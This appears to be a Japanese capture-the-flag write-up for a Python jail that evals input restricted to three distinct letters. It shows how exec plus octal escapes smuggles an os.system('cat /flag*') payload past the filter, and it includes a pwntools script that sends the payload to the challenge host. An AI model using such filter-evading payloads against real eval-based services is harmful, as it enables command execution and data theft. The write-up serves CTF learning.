# Not so Pyf**k

## 問題

英字は3種類までですが、他の文字には制限がありません。

```py
code = input("jail > ")

if not code.isascii():
    print("Not ascii")
    exit()

if len(set(c for c in code if c.isalpha())) > 3:
    print("Too many alphabets")
    exit()

eval(code)
```

## 概要

実行すると、codeの入力を求められ、入力したコードがevalに渡されて計算されますが、ASCII文字以外の文字や、3種類を超えるアルファベットの入力は許されません。

フラグは`/flag-<ハッシュ値>.txt`にあるようですが、どうすればフラグを取得できるのでしょうか？

## 解法

まず、この状況で何ができるのかを探るため、アルファベット文字が3種類以下の組み込み関数等の名前を列挙してみました。

```py
print([f for f in dir(__builtins__) if len(set(c for c in f if c.isalpha())) <= 3])
```
```
['__doc__', 'abs', 'all', 'any', 'bin', 'bool', 'chr', 'dir', 'exec', 'hash', 'hex', 'id', 'int', 'len', 'map', 'max', 'min', 'oct', 'ord', 'pow', 'repr', 'set', 'str', 'sum', 'zip']
```

実行結果を眺めてみると、めっちゃ使えそうな`exec`がありました。

`exec`は4文字だけど`e`が被っているから3種類なのですね。

そこで、いったん文字種の条件を削除して`docker compose up --build`しなおしてから
```py
exec("import os;os.system('cat /flag*')")
```
を送ってみます。

※evalの中ではimportできませんが、execの中ならできます。

すると、
```
jail > exec("import os;os.system('cat /flag*')")
Alpaca{REDACTED}
```
このようにフラグを得ることができました。

しかし、これだと文字種が多すぎてダメです。

アルファベット以外の数字や記号は何種類あっても許されるので、この"..."の部分をエスケープすればいけるのではないでしょうか？

まず先ほどのコードを変換してみます。

```py
code = "import os;os.system('cat /flag*')"
print(f"exec(\"{''.join(f'\\x{ord(ch):02x}' for ch in code)}\")")
```

この変換結果を送ってみます。

```
jail > exec("\x69\x6d\x70\x6f\x72(略)\x29")
Too many alphabets
```

ダメでした。`x`は`exec`に含まれているため大丈夫ですが、これに入っていない`a`,`b`,`d`,`f`が出てきてしまうからですね。

それなら8進数にしてみましょう。8進数なら0～7だけですからね。

```py
code = "import os;os.system('cat /flag*')"
print(f"exec(\"{''.join(f'\\{ord(ch):03o}' for ch in code)}\")")
```

これでやってみましょう。

```
jail > exec("\151\155\160\157\162(略)\051")
Alpaca{REDACTED}
```

できました！

```py
from pwn import remote

HOST, PORT = "localhost", 1337
# HOST, PORT = "34.170.146.252", 52877

code = "import os;os.system('cat /flag*')"
payload = f"exec(\"{''.join(f'\\{ord(ch):03o}' for ch in code)}\")".encode()

p = remote(HOST, PORT)
p.sendlineafter(b'jail > ', payload)
print(p.recvline().decode())
```

## その他

本番のフラグには「36文字でできるよ」みたいなことが書いてあります。

36文字！？いったい何をどうすればそんなに短くできるのでしょうか？

`cat /flag*`ではなく`sh`に変え、変換する必要のない記号や`e`をそのままにしてみたところ、140文字 → 84文字まで削減することができましたが、これ以上はわかりませんでした。
